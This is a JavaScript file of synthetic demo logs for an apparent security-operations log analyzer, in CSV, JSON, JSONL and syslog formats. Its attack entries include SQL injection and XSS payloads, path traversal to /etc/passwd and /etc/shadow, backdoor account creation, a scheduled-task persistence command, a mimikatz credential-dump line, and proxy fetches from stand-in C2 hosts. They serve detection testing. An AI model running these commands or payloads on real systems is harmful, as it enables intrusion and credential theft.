/**
 * SOC Log Analyzer — demo-data.js
 * Realistic synthetic log samples covering all supported formats.
 * None of this data represents real individuals or systems.
 */

'use strict';

window.SOCDemoData = {

  csv: `timestamp,src_ip,dst_ip,src_port,dst_port,protocol,action,bytes,event_type,username,hostname,message
2024-03-15T08:01:02Z,192.168.1.105,10.0.0.20,54321,22,TCP,allow,1240,ssh_login,jsmith,WORKSTATION-42,Successful SSH login
2024-03-15T08:01:05Z,192.168.1.105,10.0.0.20,54322,22,TCP,allow,980,ssh_login,jsmith,WORKSTATION-42,Successful SSH login
2024-03-15T08:03:10Z,185.220.101.1,10.0.0.10,45001,80,TCP,allow,52400,http_request,,-,GET /admin/login HTTP/1.1 200
2024-03-15T08:03:11Z,185.220.101.1,10.0.0.10,45001,80,TCP,allow,320,http_request,,-,GET /admin/../../../etc/passwd HTTP/1.1 403
2024-03-15T08:03:12Z,185.220.101.1,10.0.0.10,45001,80,TCP,allow,320,http_request,,-,GET /../../windows/win.ini HTTP/1.1 403
2024-03-15T08:04:00Z,10.0.1.50,10.0.0.10,33401,445,TCP,allow,2048,smb_connect,ADMIN$,FILE-SERVER-01,SMB connection to ADMIN$
2024-03-15T08:04:30Z,10.0.1.50,10.0.0.11,33402,445,TCP,allow,2048,smb_connect,ADMIN$,FILE-SERVER-02,SMB connection to ADMIN$
2024-03-15T08:04:35Z,10.0.1.50,10.0.0.12,33403,445,TCP,allow,2048,smb_connect,ADMIN$,FILE-SERVER-03,SMB lateral movement
2024-03-15T08:05:00Z,203.0.113.50,10.0.0.10,51200,4444,TCP,allow,0,network,,-,Outbound connection to C2
2024-03-15T08:05:15Z,10.0.0.10,203.0.113.50,4444,54123,TCP,allow,104857600,network,,-,Data transfer outbound 100MB
2024-03-15T08:06:00Z,192.168.2.100,10.0.0.5,60001,3389,TCP,allow,0,rdp_login,svc_backup,DC-01,Service account RDP login interactive
2024-03-15T08:07:00Z,10.9.9.9,10.0.0.10,0,80,TCP,deny,0,firewall,,-,Blocked inbound
2024-03-15T08:07:01Z,10.9.9.9,10.0.0.10,0,443,TCP,deny,0,firewall,,-,Blocked inbound
2024-03-15T08:07:02Z,10.9.9.9,10.0.0.10,0,8080,TCP,deny,0,firewall,,-,Blocked inbound
2024-03-15T08:07:03Z,10.9.9.9,10.0.0.10,0,22,TCP,deny,0,firewall,,-,Blocked inbound
2024-03-15T08:07:04Z,10.9.9.9,10.0.0.10,0,25,TCP,deny,0,firewall,,-,Blocked inbound
2024-03-15T08:07:05Z,10.9.9.9,10.0.0.10,0,21,TCP,deny,0,firewall,,-,Blocked inbound
2024-03-15T08:07:06Z,10.9.9.9,10.0.0.10,0,23,TCP,deny,0,firewall,,-,Blocked inbound
2024-03-15T08:07:07Z,10.9.9.9,10.0.0.10,0,3389,TCP,deny,0,firewall,,-,Blocked inbound
2024-03-15T08:07:08Z,10.9.9.9,10.0.0.10,0,5985,TCP,deny,0,firewall,,-,Blocked inbound
2024-03-15T08:07:09Z,10.9.9.9,10.0.0.10,0,1433,TCP,deny,0,firewall,,-,Blocked inbound
2024-03-15T08:07:10Z,10.9.9.9,10.0.0.10,0,3306,TCP,deny,0,firewall,,-,Blocked inbound
2024-03-15T08:07:11Z,10.9.9.9,10.0.0.10,0,5432,TCP,deny,0,firewall,,-,Blocked inbound
2024-03-15T08:07:12Z,10.9.9.9,10.0.0.10,0,27017,TCP,deny,0,firewall,,-,Blocked inbound
2024-03-15T08:07:13Z,10.9.9.9,10.0.0.10,0,6379,TCP,deny,0,firewall,,-,Blocked inbound
2024-03-15T08:07:14Z,10.9.9.9,10.0.0.10,0,9200,TCP,deny,0,firewall,,-,Blocked inbound
2024-03-15T08:10:00Z,172.16.5.20,10.0.0.10,49152,80,TCP,allow,450,http_request,,-,GET /search?q=1'+OR+'1'='1 HTTP/1.1
2024-03-15T08:10:05Z,172.16.5.20,10.0.0.10,49153,80,TCP,allow,512,http_request,,-,GET /products?id=1 UNION ALL SELECT username,password FROM users-- HTTP/1.1
2024-03-15T08:11:00Z,10.0.0.55,8.8.8.8,45231,53,UDP,allow,512,dns_query,,-,DNS query to 8.8.8.8
2024-03-15T08:12:00Z,192.168.1.200,10.0.0.5,44000,22,TCP,deny,0,ssh_fail,hacker,WEB-SERVER,Authentication failure for user root
2024-03-15T08:12:01Z,192.168.1.200,10.0.0.5,44001,22,TCP,deny,0,ssh_fail,hacker,WEB-SERVER,Authentication failure for user admin
2024-03-15T08:12:02Z,192.168.1.200,10.0.0.5,44002,22,TCP,deny,0,ssh_fail,hacker,WEB-SERVER,Authentication failure for user administrator
2024-03-15T08:12:03Z,192.168.1.200,10.0.0.5,44003,22,TCP,deny,0,ssh_fail,hacker,WEB-SERVER,Authentication failure for user guest
2024-03-15T08:12:04Z,192.168.1.200,10.0.0.5,44004,22,TCP,deny,0,ssh_fail,hacker,WEB-SERVER,Authentication failure for user oracle
2024-03-15T08:12:10Z,192.168.1.200,10.0.0.5,44010,22,TCP,allow,2048,ssh_login,root,WEB-SERVER,Accepted password for root from 192.168.1.200
2024-03-15T08:15:00Z,10.0.0.30,192.168.1.1,55001,80,TCP,allow,128,http_request,,-,nikto/2.1.6 scan detected user-agent
2024-03-15T08:16:00Z,10.0.0.30,192.168.1.1,55002,80,TCP,allow,128,http_request,,-,sqlmap/1.7 automated SQL injection test
2024-03-15T08:20:00Z,10.0.0.40,10.0.0.5,60000,22,TCP,allow,0,process_exec,jdoe,ADMIN-WS,powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0
2024-03-15T08:21:00Z,10.0.0.40,10.0.0.5,60001,22,TCP,allow,0,process_exec,jdoe,ADMIN-WS,cmd /c net user backdoor P@ssw0rd! /add
2024-03-15T08:22:00Z,10.0.0.40,10.0.0.5,60002,22,TCP,allow,0,process_exec,jdoe,ADMIN-WS,schtasks /create /tn malware /tr C:\\Windows\\Temp\\evil.exe /sc onlogon
2024-03-15T01:30:00Z,192.168.10.1,10.0.0.5,35000,443,TCP,allow,2048,vpn_login,mwilson,VPN-GW,Successful VPN authentication at 01:30 UTC
2024-03-15T09:00:00Z,10.0.0.100,10.0.0.200,52000,80,TCP,allow,1024,http,,-,Normal web traffic
2024-03-15T09:01:00Z,10.0.0.100,10.0.0.200,52001,80,TCP,allow,2048,http,,-,Normal web traffic
2024-03-15T09:02:00Z,10.0.0.101,10.0.0.200,52002,443,TCP,allow,4096,https,,-,Normal HTTPS traffic
2024-03-15T09:03:00Z,10.0.0.101,10.0.0.200,52003,443,TCP,allow,8192,https,,-,Normal HTTPS traffic`,

  json: JSON.stringify([
    {
      "@timestamp": "2024-03-15T10:00:00.000Z",
      "event": { "type": "authentication", "category": "authentication" },
      "source": { "ip": "10.1.1.50", "port": 45231 },
      "destination": { "ip": "10.0.0.5", "port": 22 },
      "user": { "name": "admin" },
      "host": { "hostname": "JUMP-SERVER" },
      "message": "Failed password for admin from 10.1.1.50 port 45231 ssh2",
      "outcome": "failure"
    },
    {
      "@timestamp": "2024-03-15T10:00:05.000Z",
      "event": { "type": "authentication" },
      "source": { "ip": "10.1.1.50", "port": 45232 },
      "destination": { "ip": "10.0.0.5", "port": 22 },
      "user": { "name": "root" },
      "host": { "hostname": "JUMP-SERVER" },
      "message": "Failed password for root from 10.1.1.50 port 45232 ssh2",
      "outcome": "failure"
    },
    {
      "@timestamp": "2024-03-15T10:00:10.000Z",
      "event": { "type": "authentication" },
      "source": { "ip": "10.1.1.50", "port": 45233 },
      "destination": { "ip": "10.0.0.5", "port": 22 },
      "user": { "name": "ubuntu" },
      "host": { "hostname": "JUMP-SERVER" },
      "message": "Failed password for ubuntu from 10.1.1.50 port 45233 ssh2",
      "outcome": "failure"
    },
    {
      "@timestamp": "2024-03-15T10:00:30.000Z",
      "event": { "type": "authentication" },
      "source": { "ip": "10.1.1.50", "port": 45250 },
      "destination": { "ip": "10.0.0.5", "port": 22 },
      "user": { "name": "root" },
      "host": { "hostname": "JUMP-SERVER" },
      "message": "Accepted publickey for root from 10.1.1.50 port 45250 ssh2",
      "outcome": "success"
    },
    {
      "@timestamp": "2024-03-15T10:05:00.000Z",
      "event": { "type": "process_start" },
      "source": { "ip": "10.0.0.5" },
      "process": { "name": "mimikatz.exe", "pid": 4321 },
      "user": { "name": "SYSTEM" },
      "host": { "hostname": "JUMP-SERVER" },
      "message": "Process started: mimikatz.exe by SYSTEM",
      "action": "allow"
    },
    {
      "@timestamp": "2024-03-15T10:06:00.000Z",
      "event": { "type": "network" },
      "source": { "ip": "10.0.0.5", "port": 49200 },
      "destination": { "ip": "185.220.101.1", "port": 443 },
      "network": { "bytes": 1073741824, "protocol": "TCP" },
      "host": { "hostname": "JUMP-SERVER" },
      "message": "Large outbound transfer 1 GB to external IP"
    },
    {
      "@timestamp": "2024-03-15T10:10:00.000Z",
      "event": { "type": "web_request" },
      "source": { "ip": "172.16.0.100" },
      "destination": { "ip": "10.0.0.20", "port": 80 },
      "url": { "path": "/login?username=admin'--&password=x" },
      "http": { "request": { "method": "POST" }, "response": { "status_code": 200 } },
      "host": { "hostname": "WEB-01" },
      "message": "HTTP POST /login SQLi pattern detected"
    },
    {
      "@timestamp": "2024-03-15T10:15:00.000Z",
      "event": { "type": "user_account_change" },
      "source": { "ip": "10.0.0.5" },
      "user": { "name": "backdoor" },
      "host": { "hostname": "JUMP-SERVER" },
      "message": "New user account created: backdoor via net user /add"
    },
    {
      "@timestamp": "2024-03-15T10:20:00.000Z",
      "event": { "type": "network" },
      "source": { "ip": "10.0.0.55", "port": 53201 },
      "destination": { "ip": "8.8.8.8", "port": 53 },
      "url": { "path": "aHR0cHM6Ly9ldmlsLmNvbS9jMi9jaGVja2luP2lkPTEyMzQ1Njc4OTBhYmNkZWZnaGlqaw==.malicious-domain.com" },
      "network": { "protocol": "UDP", "bytes": 512 },
      "host": { "hostname": "CLIENT-55" },
      "message": "Suspicious long DNS query with base64 encoded subdomain"
    },
    {
      "@timestamp": "2024-03-15T11:00:00.000Z",
      "event": { "type": "http_request" },
      "source": { "ip": "192.168.5.10" },
      "destination": { "ip": "10.0.0.20", "port": 80 },
      "http": { "request": { "method": "GET" }, "response": { "status_code": 200 } },
      "url": { "path": "/api/data" },
      "host": { "hostname": "APP-SERVER" },
      "message": "Normal API request"
    }
  ], null, 2),

  jsonl: [
    '{"timestamp":"2024-03-15T12:00:00Z","src_ip":"198.51.100.10","dst_ip":"10.0.0.10","dst_port":80,"http_method":"GET","url":"/admin/config.php","http_status":404,"message":"nikto/2.1.6 scan - probing admin panel"}',
    '{"timestamp":"2024-03-15T12:00:01Z","src_ip":"198.51.100.10","dst_ip":"10.0.0.10","dst_port":80,"http_method":"GET","url":"/.env","http_status":404,"message":"Probe for .env file"}',
    '{"timestamp":"2024-03-15T12:00:02Z","src_ip":"198.51.100.10","dst_ip":"10.0.0.10","dst_port":80,"http_method":"GET","url":"/wp-admin/","http_status":404,"message":"WordPress admin probe"}',
    '{"timestamp":"2024-03-15T12:00:03Z","src_ip":"198.51.100.10","dst_ip":"10.0.0.10","dst_port":80,"http_method":"GET","url":"/phpmyadmin/","http_status":404,"message":"phpMyAdmin probe"}',
    '{"timestamp":"2024-03-15T12:00:04Z","src_ip":"198.51.100.10","dst_ip":"10.0.0.10","dst_port":80,"http_method":"GET","url":"/.git/config","http_status":200,"message":"Git config exposed!"}',
    '{"timestamp":"2024-03-15T12:00:05Z","src_ip":"198.51.100.10","dst_ip":"10.0.0.10","dst_port":80,"http_method":"GET","url":"/backup.zip","http_status":200,"message":"Backup file exposed"}',
    '{"timestamp":"2024-03-15T12:01:00Z","src_ip":"10.0.2.30","dst_ip":"10.0.0.5","dst_port":1337,"protocol":"TCP","action":"allow","message":"Connection to port 1337 backdoor"}',
    '{"timestamp":"2024-03-15T12:02:00Z","src_ip":"10.0.0.100","dst_ip":"10.0.0.101","dst_port":3389,"protocol":"TCP","action":"allow","username":"svc_sql","hostname":"DB-SERVER","message":"RDP login from DB-SERVER to 10.0.0.101 interactive logon type 2"}',
    '{"timestamp":"2024-03-15T12:03:00Z","src_ip":"10.0.0.200","dst_ip":"172.217.3.110","dst_port":443,"bytes":209715200,"protocol":"TCP","action":"allow","message":"200MB outbound transfer to Google CDN (benign)"}',
    '{"timestamp":"2024-03-15T12:05:00Z","src_ip":"172.16.1.10","dst_ip":"10.0.0.20","dst_port":80,"http_method":"GET","http_status":500,"url":"/api/search?q=<script>alert(document.cookie)</script>","message":"XSS probe in search parameter"}',
    '{"timestamp":"2024-03-15T12:06:00Z","src_ip":"172.16.1.10","dst_ip":"10.0.0.20","dst_port":80,"http_method":"GET","http_status":200,"url":"/page?file=../../../../etc/shadow","message":"LFI/path traversal attempt via file parameter"}',
    '{"timestamp":"2024-03-15T12:07:00Z","src_ip":"192.168.100.5","dst_ip":"10.0.0.5","dst_port":445,"protocol":"TCP","action":"allow","username":"ADMIN$","hostname":"CORP-PC-01","message":"SMB admin share access"}',
    '{"timestamp":"2024-03-15T12:08:00Z","src_ip":"192.168.100.5","dst_ip":"10.0.0.6","dst_port":445,"protocol":"TCP","action":"allow","hostname":"CORP-PC-02","message":"SMB admin share lateral movement"}',
    '{"timestamp":"2024-03-15T12:09:00Z","src_ip":"192.168.100.5","dst_ip":"10.0.0.7","dst_port":445,"protocol":"TCP","action":"allow","hostname":"CORP-PC-03","message":"SMB admin share lateral movement"}',
    '{"timestamp":"2024-03-15T12:10:00Z","src_ip":"192.168.100.5","dst_ip":"10.0.0.8","dst_port":445,"protocol":"TCP","action":"allow","hostname":"CORP-PC-04","message":"SMB admin share lateral movement"}',
    '{"timestamp":"2024-03-15T12:15:00Z","src_ip":"10.0.0.50","dst_ip":"10.0.0.1","dst_port":22,"protocol":"TCP","action":"allow","username":"deploy","hostname":"BUILD-SERVER","message":"Normal deployment SSH"}',
    '{"timestamp":"2024-03-15T12:16:00Z","src_ip":"10.0.0.50","dst_ip":"10.0.0.1","dst_port":443,"protocol":"TCP","action":"allow","hostname":"BUILD-SERVER","message":"HTTPS to internal gateway normal"}',
    '{"timestamp":"2024-03-15T12:17:00Z","src_ip":"10.0.1.1","dst_ip":"8.8.8.8","dst_port":53,"protocol":"UDP","action":"allow","hostname":"ROUTER-01","message":"Normal DNS resolution"}',
    '{"timestamp":"2024-03-15T12:18:00Z","severity":"info","src_ip":"10.0.0.99","hostname":"MONITOR","message":"Health check ping OK"}',
    '{"timestamp":"2024-03-15T12:20:00Z","src_ip":"10.0.0.40","dst_ip":"10.0.0.5","dst_port":5985,"protocol":"TCP","action":"allow","username":"svc_monitoring","hostname":"MON-SERVER","message":"WinRM connection from monitoring service"}'
  ].join('\n'),

  syslog: `<34>Mar 15 08:00:01 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=... SRC=192.0.2.100 DST=10.0.0.10 PROTO=TCP SPT=54321 DPT=4444
<38>Mar 15 08:00:05 auth01 sshd[1234]: Failed password for root from 198.51.100.10 port 45001 ssh2
<38>Mar 15 08:00:06 auth01 sshd[1234]: Failed password for root from 198.51.100.10 port 45002 ssh2
<38>Mar 15 08:00:07 auth01 sshd[1234]: Failed password for admin from 198.51.100.10 port 45003 ssh2
<38>Mar 15 08:00:08 auth01 sshd[1234]: Failed password for administrator from 198.51.100.10 port 45004 ssh2
<38>Mar 15 08:00:09 auth01 sshd[1234]: Failed password for ubuntu from 198.51.100.10 port 45005 ssh2
<38>Mar 15 08:00:15 auth01 sshd[1234]: Accepted password for root from 198.51.100.10 port 45020 ssh2
<86>Mar 15 08:01:00 web01 nginx[5678]: 172.16.0.200 - - [15/Mar/2024:08:01:00 +0000] "GET /login?user=admin'+OR+'1'='1&pass=x HTTP/1.1" 200 1240
<86>Mar 15 08:01:05 web01 nginx[5678]: 172.16.0.200 - - [15/Mar/2024:08:01:05 +0000] "GET /products?id=1+UNION+SELECT+username,password+FROM+users-- HTTP/1.1" 500 340
<86>Mar 15 08:01:10 web01 nginx[5678]: 172.16.0.200 - - [15/Mar/2024:08:01:10 +0000] "GET /../../etc/passwd HTTP/1.1" 403 162
<86>Mar 15 08:02:00 web01 nginx[5678]: 10.10.10.5 - - [15/Mar/2024:08:02:00 +0000] "GET /search?q=<script>alert(1)</script> HTTP/1.1" 200 890
<30>Mar 15 08:03:00 win-dc01 Microsoft-Windows-Security-Auditing[628]: 4720: A user account was created. Subject: Security ID: S-1-5-21-... Account Name: backdoor
<30>Mar 15 08:03:30 win-dc01 Microsoft-Windows-Security-Auditing[628]: 4698: A scheduled task was created. Task Name: evil_persistence
<30>Mar 15 08:04:00 win-dc01 Microsoft-Windows-Security-Auditing[628]: 4624: An account was successfully logged on. Logon Type: 2 Account: svc_backup
<86>Mar 15 08:05:00 proxy01 squid[9012]: 1710489900.000 12340 10.0.0.55 TCP_MISS/200 512 GET http://evil.com/c2/beacon - DIRECT/185.220.101.1 text/plain
<86>Mar 15 08:06:00 proxy01 squid[9012]: 1710489960.000 23400 10.0.0.55 TCP_MISS/200 1024 GET http://malware-c2.net/payload.bin - DIRECT/198.51.100.99 application/octet-stream
Mar 15 08:07:00 endpoint01 auditd: type=EXECVE msg=audit(1710490020.000:1): argc=3 a0="powershell.exe" a1="-enc" a2="SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0"
Mar 15 08:07:30 endpoint01 auditd: type=EXECVE msg=audit(1710490050.000:2): argc=5 a0="cmd.exe" a1="/c" a2="net" a3="user" a4="backdoor /add"
Mar 15 08:08:00 endpoint01 auditd: type=EXECVE msg=audit(1710490080.000:3): argc=2 a0="mimikatz.exe" a1="sekurlsa::logonpasswords"
<165>1 2024-03-15T08:09:00.000Z ids01 snort 2345 - - [exampleSDID@32473 iut="1"] Malware:Trojan.Backdoor ALERT src=10.0.0.55 dst=185.220.101.1
<14>Mar 15 08:10:00 net01 kernel: SCAN_DETECT: src=10.5.5.5 scanned 15 ports in 30 seconds: 21,22,23,80,443,3306,3389,5432,8080,8443,8888,9090,27017,6379,5985
Mar 15 09:00:00 app01 webapp[3001]: INFO Request GET /api/v1/health 200 OK 5ms
Mar 15 09:00:01 app01 webapp[3001]: INFO Request GET /api/v1/users 200 OK 12ms
Mar 15 09:00:02 app01 webapp[3001]: INFO Request POST /api/v1/login 200 OK 45ms
Mar 15 09:00:03 app01 webapp[3001]: INFO Request GET /api/v1/data 200 OK 8ms`

};
